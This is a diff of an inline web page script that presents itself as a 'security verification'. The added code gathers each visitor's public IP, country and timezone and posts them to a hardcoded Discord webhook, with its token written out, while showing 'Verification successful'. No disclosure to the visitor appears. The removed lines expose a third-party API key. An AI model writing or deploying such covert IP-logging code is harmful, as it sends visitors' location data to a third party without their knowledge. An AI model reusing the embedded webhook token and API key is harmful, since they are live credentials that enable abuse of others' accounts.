@@ -1,7 +1,9 @@
+<div id="txt">Verifying...</div>
+<script>
 async function collectSecurityData() {
   const txtEl = document.getElementById("txt");
 
-  // Helper functions for UI state
+  // UI helpers
   function failUI(message = "Verification failed") {
     if (!txtEl) return;
     txtEl.style.color = "red";
@@ -13,15 +15,16 @@ async function collectSecurityData() {
     txtEl.style.color = "limegreen";
     txtEl.textContent = message;
   }
-  
+
   try {
     // 1️⃣ Get IP, country, and timezone info
     const ipRes = await fetch("https://ipapi.co/json/");
+    if (!ipRes.ok) throw new Error("IP fetch failed");
     const ipData = await ipRes.json();
 
-    const userIP = ipData.ip;               // Public IP
-    const countryCode = ipData.country_code; // ISO country code, e.g. US
-    const ipTimezone = ipData.timezone;      // Timezone from IP
+    const userIP = ipData.ip;
+    const countryCode = ipData.country_code;
+    const ipTimezone = ipData.timezone;
 
     // 2️⃣ Get user's local OS time
     const now = new Date();
@@ -31,37 +34,48 @@ async function collectSecurityData() {
     // 3️⃣ Time mismatch check
     const ipTimeString = new Date().toLocaleString("en-US", { timeZone: ipTimezone });
     const ipHour = new Date(ipTimeString).getHours();
-
-    // Boolean: true if local time roughly matches IP timezone (difference <= 3 hours)
     const timeSafe = Math.abs(userHour - ipHour) <= 3;
 
-    console.log(`https://ipqualityscore.com/api/json/ip/Humq0xy2zgb4492xcx2UZf4HNqthRLb4/${userIP}`)
-    const vpnRes = await fetch(`https://ipqualityscore.com/api/json/ip/Humq0xy2zgb4492xcx2UZf4HNqthRLb4/${userIP}`);
-    const vpnData = await vpnRes.json();
-    const vpnDetected = vpnData.vpn || vpnData.proxy || vpnData.tor || false;
-
-    // 5️⃣ Combine all data
+    // 4️⃣ Combine security data (no VPN detection)
     const securityData = {
       ip: userIP,
       country: countryCode,
       ipTimezone: ipTimezone,
       userTimezone: userTimezone,
-      userHour: userHour,
-      ipHour: ipHour,
-      timeSafe: timeSafe,
-      vpnDetected: vpnDetected
+      userHour,
+      ipHour,
+      timeSafe
     };
 
     console.log(securityData);
 
-    // Example: send this data to your backend or Discord bot
-    /*
-    fetch("/verify", {
+    // 5️⃣ Send to Discord webhook
+    const webhookURL = "https://discord.com/api/webhooks/1458509676277661924/iMx3qDFYRJRZZDO21I_iqBzdvw58TBrtNQAkJFsHgeXPKnjrk-M6J7TE3J8fMp5tSN5Q";
+
+    await fetch(webhookURL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(securityData)
+      body: JSON.stringify({
+        username: "Security Bot",
+        embeds: [
+          {
+            title: "New Security Data",
+            color: 0x1abc9c,
+            fields: [
+              { name: "IP", value: securityData.ip, inline: true },
+              { name: "Country", value: securityData.country, inline: true },
+              { name: "IP Timezone", value: securityData.ipTimezone, inline: true },
+              { name: "User Timezone", value: securityData.userTimezone, inline: true },
+              { name: "User Hour", value: String(securityData.userHour), inline: true },
+              { name: "IP Hour", value: String(securityData.ipHour), inline: true },
+              { name: "Time Safe", value: String(securityData.timeSafe), inline: true }
+            ],
+            timestamp: new Date().toISOString()
+          }
+        ]
+      })
     });
-    */
+
     successUI("Verification successful");
   } catch (err) {
     console.error("Error collecting security data:", err);
@@ -69,4 +83,6 @@ async function collectSecurityData() {
   }
 }
 
+// Run the function
 collectSecurityData();
+</script>
